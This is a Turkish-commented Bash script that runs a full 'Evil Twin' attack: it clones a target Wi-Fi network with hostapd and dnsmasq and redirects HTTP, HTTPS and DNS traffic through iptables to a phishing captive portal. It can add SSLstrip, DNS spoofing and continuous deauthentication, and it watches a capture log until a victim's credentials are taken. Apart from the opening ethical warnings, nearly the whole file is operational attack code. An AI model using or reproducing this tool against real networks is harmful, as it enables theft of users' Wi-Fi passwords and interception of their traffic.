#!/bin/bash

# Evil Twin Saldırı Başlatma Scripti
# Evil Twin Attack Toolkit

# Renkli çıktı için
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${RED}"
echo "================================================"
echo "           Evil Twin Saldırı Başlatıcı"
echo "         Evil Twin Attack Toolkit"
echo "================================================"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[HATA] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo "Kullanım: sudo $0 [seçenekler]"
   exit 1
fi

# Etik uyarı
echo -e "${RED}[UYARI] Bu araç sadece eğitim ve güvenlik testleri içindir!${NC}"
echo -e "${RED}[UYARI] Sadece kendi ağlarınızda veya izinli ortamlarda kullanın!${NC}"
echo -e "${RED}[UYARI] Yasal sorumluluğu kullanıcıya aittir!${NC}"
echo -e "${RED}[UYARI] Bu saldırı türü birçok ülkede yasadışıdır!${NC}"
echo
read -p "Devam etmek için 'KABUL EDIYORUM' yazın: " confirmation
if [ "$confirmation" != "KABUL EDIYORUM" ]; then
    echo -e "${YELLOW}[BİLGİ] İşlem iptal edildi.${NC}"
    exit 0
fi
echo

# Varsayılan değerler
TARGET_SSID=""
TARGET_BSSID=""
TARGET_CHANNEL=""
INTERFACE=""
ETH_INTERFACE="eth0"
FAKE_SSID=""
CAPTIVE_PORTAL=true
DEAUTH_ATTACK=false
SSLSTRIP=false
DNS_SPOOF=false
AUTO_DETECT=false
CONTINUOUS=false
LOG_DIR="./logs"
WEB_DIR="./web"
CONFIG_DIR="./config"

# PID dosyaları
HOSTAPD_PID=""
DNSMASQ_PID=""
SSLSTRIP_PID=""
DEAUTH_PID=""

# Yardım fonksiyonu
show_help() {
    echo "Kullanım: $0 [SEÇENEKLER]"
    echo
    echo "SEÇENEKLER:"
    echo "  -s, --ssid SSID             Hedef SSID"
    echo "  -b, --bssid BSSID           Hedef BSSID"
    echo "  -c, --channel KANAL         Hedef kanal"
    echo "  -i, --interface INTERFACE   Monitor interface"
    echo "  -e, --eth INTERFACE         Ethernet interface (varsayılan: eth0)"
    echo "  -f, --fake-ssid SSID        Sahte SSID (varsayılan: hedef SSID)"
    echo "  -p, --no-portal             Captive portal'ı devre dışı bırak"
    echo "  -d, --deauth                Deauth saldırısı başlat"
    echo "  -S, --sslstrip              SSLstrip aktifleştir"
    echo "  -D, --dns-spoof             DNS spoofing aktifleştir"
    echo "  -a, --auto                  Otomatik hedef tespit"
    echo "  -C, --continuous            Sürekli saldırı modu"
    echo "  -l, --log-dir DIZIN         Log dizini (varsayılan: ./logs)"
    echo "  -h, --help                  Bu yardım mesajını göster"
    echo
    echo "ÖRNEKLER:"
    echo "  $0                          # Kaydedilen hedefi kullan"
    echo "  $0 -s \"TargetWiFi\" -c 6      # Basit Evil Twin"
    echo "  $0 -b aa:bb:cc:dd:ee:ff -d  # BSSID ile deauth"
    echo "  $0 -a -S -D                 # Otomatik + SSLstrip + DNS"
    echo "  $0 -s \"Guest\" -p -C          # Portal'sız sürekli mod"
    echo
    echo "NOT: Hedef belirtilmezse, scan_networks.sh ile kaydedilen"
    echo "     son hedef otomatik olarak yüklenir."
}

# Parametre işleme
while [[ $# -gt 0 ]]; do
    case $1 in
        -s|--ssid)
            TARGET_SSID="$2"
            shift 2
            ;;
        -b|--bssid)
            TARGET_BSSID="$2"
            shift 2
            ;;
        -c|--channel)
            TARGET_CHANNEL="$2"
            shift 2
            ;;
        -i|--interface)
            INTERFACE="$2"
            shift 2
            ;;
        -e|--eth)
            ETH_INTERFACE="$2"
            shift 2
            ;;
        -f|--fake-ssid)
            FAKE_SSID="$2"
            shift 2
            ;;
        -p|--no-portal)
            CAPTIVE_PORTAL=false
            shift
            ;;
        -d|--deauth)
            DEAUTH_ATTACK=true
            shift
            ;;
        -S|--sslstrip)
            SSLSTRIP=true
            shift
            ;;
        -D|--dns-spoof)
            DNS_SPOOF=true
            shift
            ;;
        -a|--auto)
            AUTO_DETECT=true
            shift
            ;;
        -C|--continuous)
            CONTINUOUS=true
            shift
            ;;
        -l|--log-dir)
            LOG_DIR="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo -e "${RED}[HATA] Bilinmeyen parametre: $1${NC}"
            show_help
            exit 1
            ;;
    esac
done

# Kaydedilen hedef yükleme
load_saved_target() {
    local scan_dir="./logs"
    local selected_file
    
    # En son tarama sonuçlarını bul
    if [ -d "$scan_dir" ]; then
        selected_file=$(find "$scan_dir" -name "*_selected.txt" -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -d' ' -f2-)
    fi
    
    # Alternatif olarak mevcut dizinde ara
    if [ -z "$selected_file" ]; then
        selected_file=$(find . -name "*_selected.txt" -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -d' ' -f2-)
    fi
    
    if [ -f "$selected_file" ]; then
        echo -e "${CYAN}[BİLGİ] Kaydedilen hedef bulundu: $selected_file${NC}"
        
        # Dosyadan bilgileri oku
        local saved_data=$(cat "$selected_file")
        local saved_bssid=$(echo "$saved_data" | cut -d'|' -f1)
        local saved_essid=$(echo "$saved_data" | cut -d'|' -f2)
        local saved_channel=$(echo "$saved_data" | cut -d'|' -f3)
        
        echo -e "${YELLOW}[HEDEF] SSID: $saved_essid${NC}"
        echo -e "${YELLOW}[HEDEF] BSSID: $saved_bssid${NC}"
        echo -e "${YELLOW}[HEDEF] Kanal: $saved_channel${NC}"
        echo
        echo -e "${CYAN}Bu hedefi kullanmak ister misiniz? (y/n):${NC}"
        read -r use_saved
        
        if [[ "$use_saved" =~ ^[Yy]$ ]]; then
            TARGET_BSSID="$saved_bssid"
            TARGET_SSID="$saved_essid"
            TARGET_CHANNEL="$saved_channel"
            echo -e "${GREEN}[BİLGİ] Kaydedilen hedef yüklendi${NC}"
            return 0
        fi
    fi
    return 1
}

# Eğer hedef belirtilmemişse kaydedilen hedefi yükle
if [ -z "$TARGET_SSID" ] && [ -z "$TARGET_BSSID" ]; then
    if ! load_saved_target; then
        echo -e "${BLUE}[BİLGİ] Hedef belirtilmedi ve kaydedilen hedef bulunamadı${NC}"
        echo -e "${BLUE}[BİLGİ] Önce ağları tarayın ve hedef seçin:${NC}"
        echo "  sudo ./scripts/scan_networks.sh"
        echo
        echo -e "${YELLOW}Veya manuel olarak hedef belirtin:${NC}"
        echo "  $0 -s \"HedefSSID\" -c 6"
        echo "  $0 -b aa:bb:cc:dd:ee:ff -c 6"
        exit 1
    fi
fi

# Otomatik tespit
if [ "$AUTO_DETECT" = true ]; then
    echo -e "${BLUE}[BİLGİ] Otomatik hedef tespit modu aktif${NC}"
    echo -e "${BLUE}[BİLGİ] En güçlü sinyal ve en çok istemciye sahip ağ seçilecek${NC}"
    
    # Kısa tarama yap
    echo -e "${BLUE}[TARAMA] Hedef ağlar taranıyor...${NC}"
    ./scripts/scan_networks.sh -t 15 -n > /tmp/auto_scan.log 2>&1
    
    # En iyi hedefi seç (bu basit bir örnek, gerçek implementasyon daha karmaşık olabilir)
    echo -e "${YELLOW}[BİLGİ] Otomatik hedef seçimi henüz implement edilmedi${NC}"
    echo -e "${YELLOW}[BİLGİ] Lütfen manuel olarak hedef belirtin${NC}"
    exit 1
fi

# Interface otomatik tespiti
if [ -z "$INTERFACE" ]; then
    INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[HATA] Monitor mode interface bulunamadı!${NC}"
        echo "Önce monitor mode'u aktifleştirin:"
        echo "  sudo ./scripts/monitor_mode.sh wlan0"
        exit 1
    fi
fi

# Hedef kontrolü (otomatik yükleme sonrası)
if [ -z "$TARGET_SSID" ] && [ -z "$TARGET_BSSID" ]; then
    echo -e "${RED}[HATA] Hedef belirlenemedi!${NC}"
    echo "Bu durum normal şartlarda gerçekleşmemelidir."
    exit 1
fi

# Sahte SSID ayarla
if [ -z "$FAKE_SSID" ]; then
    FAKE_SSID="$TARGET_SSID"
fi

# Gerekli dosyaları kontrol et
for file in "$CONFIG_DIR/hostapd.conf" "$CONFIG_DIR/dnsmasq.conf"; do
    if [ ! -f "$file" ]; then
        echo -e "${RED}[HATA] Yapılandırma dosyası bulunamadı: $file${NC}"
        exit 1
    fi
done

if [ "$CAPTIVE_PORTAL" = true ] && [ ! -d "$WEB_DIR" ]; then
    echo -e "${RED}[HATA] Web dizini bulunamadı: $WEB_DIR${NC}"
    exit 1
fi

# Log dizini oluştur
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$LOG_DIR/evil_twin_$TIMESTAMP.log"

# Cleanup fonksiyonu
cleanup() {
    echo
    echo -e "${YELLOW}[CLEANUP] Evil Twin saldırısı durduruluyor...${NC}"
    
    # Tüm süreçleri durdur
    [ ! -z "$HOSTAPD_PID" ] && kill "$HOSTAPD_PID" 2>/dev/null
    [ ! -z "$DNSMASQ_PID" ] && kill "$DNSMASQ_PID" 2>/dev/null
    [ ! -z "$SSLSTRIP_PID" ] && kill "$SSLSTRIP_PID" 2>/dev/null
    [ ! -z "$DEAUTH_PID" ] && kill "$DEAUTH_PID" 2>/dev/null
    
    # Sistem süreçlerini durdur
    pkill -f "hostapd.*$INTERFACE" 2>/dev/null
    pkill -f "dnsmasq.*evil" 2>/dev/null
    pkill -f "sslstrip" 2>/dev/null
    pkill -f "aireplay-ng.*deauth" 2>/dev/null
    
    # Iptables kurallarını temizle
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    
    # IP forwarding'i kapat
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Interface'i restore et
    if [ ! -z "$INTERFACE" ]; then
        ./scripts/restore_interface.sh "${INTERFACE%mon}" 2>/dev/null
    fi
    
    echo -e "${GREEN}[TAMAMLANDI] Cleanup tamamlandı${NC}"
    echo -e "${BLUE}[LOG] Detaylar: $LOG_FILE${NC}"
    exit 0
}

# SIGINT yakalama
trap cleanup SIGINT

# Başlangıç bilgileri
echo -e "${BLUE}[BİLGİ] Evil Twin Saldırı Parametreleri:${NC}" | tee "$LOG_FILE"
echo "  Hedef SSID: $TARGET_SSID" | tee -a "$LOG_FILE"
echo "  Hedef BSSID: $TARGET_BSSID" | tee -a "$LOG_FILE"
echo "  Hedef Kanal: $TARGET_CHANNEL" | tee -a "$LOG_FILE"
echo "  Sahte SSID: $FAKE_SSID" | tee -a "$LOG_FILE"
echo "  Interface: $INTERFACE" | tee -a "$LOG_FILE"
echo "  Captive Portal: $CAPTIVE_PORTAL" | tee -a "$LOG_FILE"
echo "  Deauth Saldırı: $DEAUTH_ATTACK" | tee -a "$LOG_FILE"
echo "  SSLstrip: $SSLSTRIP" | tee -a "$LOG_FILE"
echo "  DNS Spoofing: $DNS_SPOOF" | tee -a "$LOG_FILE"
echo | tee -a "$LOG_FILE"

# Hedef bilgilerini tespit et
if [ ! -z "$TARGET_BSSID" ] && [ -z "$TARGET_CHANNEL" ]; then
    echo -e "${BLUE}[BİLGİ] Hedef kanal tespit ediliyor...${NC}"
    TARGET_CHANNEL=$(iwlist "$INTERFACE" scan 2>/dev/null | grep -A5 "$TARGET_BSSID" | grep "Channel" | awk '{print $1}' | cut -d: -f2)
    if [ ! -z "$TARGET_CHANNEL" ]; then
        echo -e "${GREEN}[BAŞARILI] Hedef kanal: $TARGET_CHANNEL${NC}"
    else
        echo -e "${YELLOW}[UYARI] Hedef kanal tespit edilemedi, varsayılan kanal 6 kullanılacak${NC}"
        TARGET_CHANNEL=6
    fi
fi

# Varsayılan kanal
if [ -z "$TARGET_CHANNEL" ]; then
    TARGET_CHANNEL=6
fi

# Hostapd yapılandırmasını güncelle
echo -e "${BLUE}[SETUP] Hostapd yapılandırması güncelleniyor...${NC}"
cp "$CONFIG_DIR/hostapd.conf" "/tmp/hostapd_evil.conf"
sed -i "s/^interface=.*/interface=$INTERFACE/" "/tmp/hostapd_evil.conf"
sed -i "s/^ssid=.*/ssid=$FAKE_SSID/" "/tmp/hostapd_evil.conf"
sed -i "s/^channel=.*/channel=$TARGET_CHANNEL/" "/tmp/hostapd_evil.conf"

# Dnsmasq yapılandırmasını güncelle
echo -e "${BLUE}[SETUP] Dnsmasq yapılandırması güncelleniyor...${NC}"
cp "$CONFIG_DIR/dnsmasq.conf" "/tmp/dnsmasq_evil.conf"
sed -i "s/^interface=.*/interface=$INTERFACE/" "/tmp/dnsmasq_evil.conf"

# Interface'i yapılandır
echo -e "${BLUE}[SETUP] Interface yapılandırılıyor...${NC}"
ifconfig "$INTERFACE" 192.168.1.1 netmask 255.255.255.0 up

# IP forwarding aktifleştir
echo -e "${BLUE}[SETUP] IP forwarding aktifleştiriliyor...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# Iptables kuralları
echo -e "${BLUE}[SETUP] Iptables kuralları yapılandırılıyor...${NC}"
iptables -t nat -A POSTROUTING -o "$ETH_INTERFACE" -j MASQUERADE
iptables -A FORWARD -i "$INTERFACE" -o "$ETH_INTERFACE" -j ACCEPT
iptables -A FORWARD -i "$ETH_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

# Captive portal için iptables
if [ "$CAPTIVE_PORTAL" = true ]; then
    echo -e "${BLUE}[SETUP] Captive portal yönlendirmeleri yapılandırılıyor...${NC}"
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
fi

# Web sunucusu başlat (Captive Portal)
if [ "$CAPTIVE_PORTAL" = true ]; then
    echo -e "${BLUE}[START] Web sunucusu başlatılıyor...${NC}"
    cd "$WEB_DIR"
    php -S 192.168.1.1:80 >> "$LOG_FILE" 2>&1 &
    WEB_PID=$!
    cd - > /dev/null
    echo -e "${GREEN}[BAŞARILI] Web sunucusu başlatıldı (PID: $WEB_PID)${NC}"
fi

# Hostapd başlat
echo -e "${BLUE}[START] Sahte erişim noktası başlatılıyor...${NC}"
hostapd "/tmp/hostapd_evil.conf" >> "$LOG_FILE" 2>&1 &
HOSTAPD_PID=$!
sleep 2

if ps -p "$HOSTAPD_PID" > /dev/null; then
    echo -e "${GREEN}[BAŞARILI] Hostapd başlatıldı (PID: $HOSTAPD_PID)${NC}"
else
    echo -e "${RED}[HATA] Hostapd başlatılamadı!${NC}"
    cleanup
fi

# Dnsmasq başlat
echo -e "${BLUE}[START] DHCP/DNS sunucusu başlatılıyor...${NC}"
dnsmasq -C "/tmp/dnsmasq_evil.conf" >> "$LOG_FILE" 2>&1 &
DNSMASQ_PID=$!
sleep 1

if ps -p "$DNSMASQ_PID" > /dev/null; then
    echo -e "${GREEN}[BAŞARILI] Dnsmasq başlatıldı (PID: $DNSMASQ_PID)${NC}"
else
    echo -e "${RED}[HATA] Dnsmasq başlatılamadı!${NC}"
    cleanup
fi

# SSLstrip başlat
if [ "$SSLSTRIP" = true ]; then
    echo -e "${BLUE}[START] SSLstrip başlatılıyor...${NC}"
    ./scripts/setup_sslstrip.sh -i "$INTERFACE" --start >> "$LOG_FILE" 2>&1 &
    SSLSTRIP_PID=$!
    echo -e "${GREEN}[BAŞARILI] SSLstrip başlatıldı${NC}"
fi

# Deauth saldırısı başlat
if [ "$DEAUTH_ATTACK" = true ] && [ ! -z "$TARGET_BSSID" ]; then
    echo -e "${BLUE}[START] Deauth saldırısı başlatılıyor...${NC}"
    ./scripts/deauth_attack.sh "$INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" --continuous >> "$LOG_FILE" 2>&1 &
    DEAUTH_PID=$!
    echo -e "${GREEN}[BAŞARILI] Deauth saldırısı başlatıldı${NC}"
fi

# Durum bilgisi
echo
echo -e "${GREEN}[BAŞARILI] Evil Twin saldırısı aktif!${NC}"
echo -e "${CYAN}[BİLGİ] Sahte AP: $FAKE_SSID (Kanal: $TARGET_CHANNEL)${NC}"
echo -e "${CYAN}[BİLGİ] IP Aralığı: 192.168.1.1/24${NC}"
if [ "$CAPTIVE_PORTAL" = true ]; then
    echo -e "${CYAN}[BİLGİ] Captive Portal: http://192.168.1.1${NC}"
fi
echo -e "${CYAN}[BİLGİ] Log Dosyası: $LOG_FILE${NC}"
echo
echo -e "${YELLOW}[BİLGİ] Durdurmak için CTRL+C kullanın${NC}"
echo

# İzleme döngüsü
echo -e "${BLUE}[İZLEME] Bağlantılar izleniyor...${NC}"
while true; do
    # Bağlı istemci sayısı
    CLIENT_COUNT=$(arp -a | grep "192.168.1" | wc -l)
    
    # Captive portal erişimleri
    if [ "$CAPTIVE_PORTAL" = true ] && [ -f "$WEB_DIR/captures.log" ]; then
        CAPTURE_COUNT=$(wc -l < "$WEB_DIR/captures.log")
    else
        CAPTURE_COUNT=0
    fi
    
    # Durum göster
    printf "\r${CYAN}[DURUM] İstemciler: %d | Yakalanan: %d | Süre: %s${NC}" \
        "$CLIENT_COUNT" "$CAPTURE_COUNT" "$(date '+%H:%M:%S')"
    
    # Sürekli mod kontrolü
    if [ "$CONTINUOUS" = false ] && [ "$CLIENT_COUNT" -gt 0 ] && [ "$CAPTURE_COUNT" -gt 0 ]; then
        echo
        echo -e "${GREEN}[BAŞARILI] Hedef yakalandı! Saldırı durduruluyor...${NC}"
        break
    fi
    
    sleep 5
done

# Cleanup
cleanup